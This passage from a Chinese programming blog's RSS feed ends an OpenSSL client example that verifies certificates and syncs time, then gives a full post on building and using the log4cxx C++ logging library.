<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span> SSL_CTX_load_verify_locations(ctx, <span style="color: #8abeb7;">".\\certs\\cacert.pem"</span>, <span style="color: #81a2be;">NULL</span>))
<span style="background-color: #373b41;"> </span>   {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   fprintf(stderr, <span style="color: #8abeb7;">"Error loading trust store\n"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   ERR_print_errors_fp(stderr);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   SSL_CTX_free(ctx);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Setup the connection </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="background-color: #373b41;"> </span>   bio = BIO_new_ssl_connect(ctx);

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Set the SSL_MODE_AUTO_RETRY flag </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="background-color: #373b41;"> </span>   BIO_get_ssl(bio, &amp; ssl);
<span style="background-color: #373b41;"> </span>   SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Create and setup the connection </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="background-color: #373b41;"> </span>   BIO_set_conn_hostname(bio, <span style="color: #8abeb7;">"192.168.1.5:5555"</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(BIO_do_connect(bio) &lt;= 0)
<span style="background-color: #373b41;"> </span>   {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   fprintf(stderr, <span style="color: #8abeb7;">"Error attempting to connect\n"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   ERR_print_errors_fp(stderr);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   BIO_free_all(bio);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   SSL_CTX_free(ctx);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Check the certificate </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">switch</span>(SSL_get_verify_result(ssl))
<span style="background-color: #373b41;"> </span>   {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">case</span> X509_V_OK:
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">break</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">case</span> X509_V_ERR_CERT_NOT_YET_VALID:
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">case</span> X509_V_ERR_CERT_HAS_EXPIRED:
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(timeInfo.server != -1 &amp;&amp; timeInfo.client != -1)
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   printf(<span style="color: #8abeb7;">"&#24403;&#21069;&#23458;&#25143;&#31471;&#26102;&#38388;: %s"</span>, ctime(&amp;timeInfo.client));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   printf(<span style="color: #8abeb7;">"&#24403;&#21069;&#26381;&#21153;&#22120;&#26102;&#38388;: %s"</span>, ctime(&amp;timeInfo.server));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   printf(<span style="color: #8abeb7;">"&#23581;&#35797;&#19982;&#26381;&#21153;&#22120;&#26102;&#38388;&#21516;&#27493;"</span>);

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(syncSystemTime(timeInfo.server))
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   printf(<span style="color: #8abeb7;">"&#25104;&#21151;\n"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">else</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   printf(<span style="color: #8abeb7;">"&#22833;&#36133;\n"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   printf(<span style="color: #8abeb7;">"&#35831;&#37325;&#35797;&#36830;&#25509;&#26381;&#21153;&#22120;&#65281;\n"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">default</span>:
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   fprintf(stderr, <span style="color: #8abeb7;">"Certificate verification error: %i\n"</span>, SSL_get_verify_r<span style="text-decoration: underline;">esult(ssl));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   BIO_free_all(bio);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   SSL_CTX_free(ctx);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Close the connection and free the context </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="background-color: #373b41;"> </span>   BIO_free_all(bio);
<span style="background-color: #373b41;"> </span>   SSL_CTX_free(ctx);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[log4cxx使用心得]]></title>
            <link>/article/log4cxx-4f7f75285fc35f97.html</link>
            <guid>/article/log4cxx-4f7f75285fc35f97.html</guid>
            <pubDate>Tue, 17 Jun 2008 02:01:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>简介

<p>
apache出品必属精品。正宗c++日志库，与log4j一脉相承。
</p>

<p>
<a href="http://logging.apache.org/log4cxx/index.html">http://logging.apache.org/log4cxx/index.html</a>
</p>
</li>

<li>下载、编译、安装

<p>
打算安装到${HOME}/libs目录下：
</p>

<div class="org-src-container">

<pre class="src src-sh"><span style="color: #b294bb;">cd</span> ~/libs
wget http://mirror.bjtu.edu.cn/apache//apr/apr-1.4.4.tar.bz2
tar xjvf apr-1.4.4.tar.bz2
<span style="color: #b294bb;">cd</span> apr-1.4.4
./configure --prefix=${<span style="color: #f0c674;">HOME</span>}/libs &amp;&amp; make &amp;&amp; make install
<span style="color: #b294bb;">cd</span> ..
wget http://mirror.bjtu.edu.cn/apache//apr/apr-util-1.3.11.tar.bz2
tar xjvf apr-util-1.3.11.tar.bz2
<span style="color: #b294bb;">cd</span> apr-util-1.3.11
./configure --prefix=${<span style="color: #f0c674;">HOME</span>}/libs --with-apr=${<span style="color: #f0c674;">HOME</span>}/libs &amp;&amp; make &amp;&amp; make instal<span style="text-decoration: underline;">l</span>
<span style="color: #b294bb;">cd</span> ..
wget http://apache.etoak.com//logging/log4cxx/0.10.0/apache-log4cxx-0.10.0.tar.g<span style="text-decoration: underline;">z</span>
tar xzvf apache-log4cxx-0.10.0.tar.gz
<span style="color: #b294bb;">cd</span> apache-log4cxx-0.10.0
./configure --with-charset=utf-8 --prefix=${<span style="color: #f0c674;">HOME</span>}/libs --with-apr=${<span style="color: #f0c674;">HOME</span>}/libs -<span style="text-decoration: underline;">-with-apr-util=${</span><span style="color: #f0c674; text-decoration: underline;">HOME</span><span style="text-decoration: underline;">}/libs &amp;&amp; make &amp;&amp; make install</span>
</pre>
</div>
</li>

<li>使用例子

<p>
<code>hello.cpp</code> ：
</p>
<div class="org-src-container">

<pre class="src src-cpp"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">"log4cxx/logger.h"</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">"log4cxx/propertyconfigurator.h"</span>

<span style="color: #b5bd68;">static</span> <span style="color: #81a2be;">log4cxx</span>::<span style="color: #81a2be;">LoggerPtr</span> <span style="color: #de935f;">logger</span>(<span style="color: #81a2be;">log4cxx</span>::<span style="color: #81a2be;">Logger</span>::getLogger(<span style="color: #8abeb7;">"hello"</span>));

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="background-color: #373b41;"> </span> <span style="color: #81a2be;">log4cxx</span>::<span style="color: #81a2be;">PropertyConfigurator</span>::configure(<span style="color: #8abeb7;">"./log4cxx_hello.properties"</span>);
<span style="background-color: #373b41;"> </span> LOG4CXX_INFO(logger, <span style="color: #8abeb7;">"&#20320;&#22909;&#65292;log4cxx!"</span>);
<span style="background-color: #373b41;"> </span> <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<p>
<code>log4cxx_hello.properties</code> ：
</p>
<pre class="example">
log4j.rootLogger=debug, R

log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout

# Pattern to output the caller's file name and line number.
log4j.appender.stdout.layout.ConversionPattern=%5p [%t] (%F:%L) - %m%n

log4j.appender.R=org.apache.log4j.RollingFileAppender
log4j.appender.R.File=./hello.log

log4j.appender.R.MaxFileSize=100KB
# Keep one backup file
log4j.appender.R.MaxBackupIndex=10

log4j.appender.R.layout=org.apache.log4j.PatternLayout
log4j.appender.R.layout.ConversionPattern=%5p %c [%t] (%F:%L) - %m%n
</pre>

<p>
编译：
</p>
<div class="org-src-container">

<pre class="src src-sh">g++ -o hello hello.cpp -I${<span style="color: #f0c674;">HOME</span>}/libs/include ${<span style="color: #f0c674;">HOME</span>}/libs/lib/liblog4cxx.a ${<span style="color: #f0c674;">HO</span><span style="color: #f0c674; text-decoration: underline;">ME</span><span style="text-decoration: underline;">}/libs/lib/libaprutil-1.a ${</span><span style="color: #f0c674; text-decoration: underline;">HOME</span><span style="text-decoration: underline;">}/libs/lib/libapr-1.a  -lexpat -lpthread</span>
</pre>
</div>
</li>

<li>注意事项

<p>
由于一个日志文件写满后会重命名所有已有的日志文件，配置过大MaxBackupIndex的会有性能问题，因此log4cxx编译时限制了它的大小（大概十多个）以避免配置的MaxBackupIndex过大，如果要设置更大一点的MaxFileSize来保存更多日志，需要在编译前进行修改。
</p>

<p>
参考：<a href="http://objectmix.com/apache/684503-urgent-log4cxx-large-window-sizes-not-allowed.html">http://objectmix.com/apache/684503-urgent-log4cxx-large-window-sizes-not-allowed.html</a>
</p>
</li>

<li>使用技巧
<ul class="org-ul">
<li>决定配置文件的格式（xml，property）。以使用相应的配置器（Configurator）装入配置文件。

<p>
xml虽较property格式繁锁，支持的配置面更全，而property格式的配置文件使用更简单，容易在网上找到现成的配置文件。
</p>
</li>

<li>logger命名

<p>
logger名称反映了软件模块，如果有代表软件模块的类，则在类中包含以该类类名命名的logger对象，该模块功能相关代码通过该logger进行日志记录。
另外可将logger对象作为全局变量，方便使用，特别是当软件模块较松散，并无对应的封装类时。
</p>
</li>

<li>在代码中适当地放置日志代码。引用适当的日志对象，对日志进行适当分级。
</li>

<li>余下的工作就是修改配置文件，对日志进行控制了。
</li>
</ul>
</li>
</ul>

<p>
　　使用配置文件的好处就是可以方便地配置日志而不需要修改源代码，可以在配置文件中方便配置日志过滤、格式、日志目的地。
</p>

<ul class="org-ul">
<li>体验
</li>
</ul>

<p>
　之前产品中用到的是log4cplus，但是常常有写日志崩溃的情况出现，使用log4cxx正是用于解决该崩溃。</p>
]]></content:encoded>
        </item>
    </channel>
</rss>